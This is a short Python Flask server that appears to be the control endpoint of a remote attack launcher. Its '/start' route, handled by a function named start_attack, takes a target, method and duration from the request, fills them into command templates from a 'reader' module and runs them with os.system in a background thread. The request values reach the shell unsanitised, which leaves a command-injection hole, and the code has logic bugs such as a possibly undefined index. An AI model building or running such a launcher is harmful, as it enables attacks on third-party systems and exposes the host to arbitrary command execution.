from flask import Flask, request
import os, threading
from reader import *

names = []
starter = []
mt = method_reader(names, starter)
mt.names()

app = Flask(__name__)


@app.route('/check')
def check():
	return 'checked'


def start(method, target, type, time):
	if method in names:
		index = names.index(method)

	for old, new in {
		"*target*": target,
		"*time*": time
	}.items():
		if old in starter[int(index)]:
			payload = starter[int(index)].replace(old, new)
		os.system(payload)

@app.route('/start', methods = ['GET', 'POST'])
def start_attack():
	cf = config_reader('type')
	if request.method == cf.read():
		target = request.args['target']
		method = request.args['method']
		type = request.args['type']
		time = request.args['time']

	threading.Thread(target=start, args=(method, target, type, time)).start()
	return 'start'

if __name__ == '__main__':
	cf = config_reader('lport')
	app.run(host = '0.0.0.0', port = int(cf.read()))
